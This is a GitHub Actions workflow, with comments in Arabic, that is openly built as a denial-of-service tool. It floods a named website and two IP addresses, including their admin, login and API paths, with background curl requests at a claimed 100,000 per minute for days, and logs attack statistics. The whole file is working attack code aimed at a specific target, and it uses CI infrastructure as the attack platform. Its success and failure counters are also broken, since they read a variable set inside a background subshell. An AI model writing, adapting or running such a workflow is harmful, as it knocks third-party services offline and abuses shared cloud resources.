name: 💀 ULTRA DOS - 100K REQUESTS/MIN

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'المدة بالدقائق'
        required: true
        default: '6500'

jobs:
  dos:
    runs-on: ubuntu-latest
    timeout-minutes: 6500
    
    steps:
      - name: Install curl
        run: sudo apt update && sudo apt install -y curl
        
      - name: 🔥 ULTRA ATTACK - 100K/MIN
        run: |
          echo "╔══════════════════════════════════════════════════════════════╗"
          echo "║     💀 ULTRA DOS - 100,000 REQUESTS PER MINUTE 💀            ║"
          echo "╚══════════════════════════════════════════════════════════════╝"
          echo ""
          echo "🎯 Target: flixtn.com"
          echo "⏱️  Duration: ${{ github.event.inputs.duration }} minutes"
          echo "⚡ Rate: 100,000 requests/minute"
          echo ""
          
          END=$((SECONDS + (${{ github.event.inputs.duration }} * 60)))
          TOTAL=0
          SUCCESS=0
          FAILED=0
          
          # الأهداف
          TARGETS=(
            "https://flixtn.com/"
            "https://flixtn.com/api"
            "https://flixtn.com/admin"
            "https://flixtn.com/login"
            "https://flixtn.com/dashboard"
            "https://flixtn.com/admin-auth"
            "https://64.29.17.65/"
            "https://216.198.79.65/"
          )
          
          echo "🔥 ATTACK STARTED - PRINTING EVERY REQUEST 🔥"
          echo ""
          
          while [ $SECONDS -lt $END ]; do
            MINUTE_START=$SECONDS
            MINUTE_COUNT=0
            
            # 100,000 طلب في الدقيقة = ~1667 طلب في الثانية
            for second in {1..60}; do
              SECOND_START=$SECONDS
              
              # 1667 طلب في هذه الثانية
              for i in {1..1667}; do
                for target in "${TARGETS[@]}"; do
                  # تنفيذ الطلب وطباعة النتيجة فورًا
                  (
                    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$target" \
                      -H "Range: bytes=0-500000" \
                      -H "User-Agent: Mozilla/5.0" \
                      --max-time 1 \
                      2>/dev/null)
                    echo "[$(date +%H:%M:%S)] 🔥 $target → $STATUS"
                  ) &
                  
                  MINUTE_COUNT=$((MINUTE_COUNT + 1))
                  TOTAL=$((TOTAL + 1))
                  
                  if [[ "$STATUS" == "200" ]]; then
                    SUCCESS=$((SUCCESS + 1))
                  else
                    FAILED=$((FAILED + 1))
                  fi
                done
              done
              
              # انتظر حتى تكتمل الثانية
              sleep 0.5
            done
            
            # إحصاءات نهاية الدقيقة
            echo ""
            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            echo "📊 MINUTE $(( (SECONDS - $MINUTE_START) / 60 )) COMPLETE"
            echo "   Requests this minute: $MINUTE_COUNT"
            echo "   Total requests: $TOTAL"
            echo "   Success: $SUCCESS | Failed: $FAILED"
            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            echo ""
          done
          
          echo ""
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
          echo "📊 FINAL STATISTICS:"
          echo "   Total requests: $TOTAL"
          echo "   Successful: $SUCCESS"
          echo "   Failed: $FAILED"
          echo "   Duration: ${{ github.event.inputs.duration }} minutes"
          echo "   Average rate: $((TOTAL / ${{ github.event.inputs.duration }})) req/min"
          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
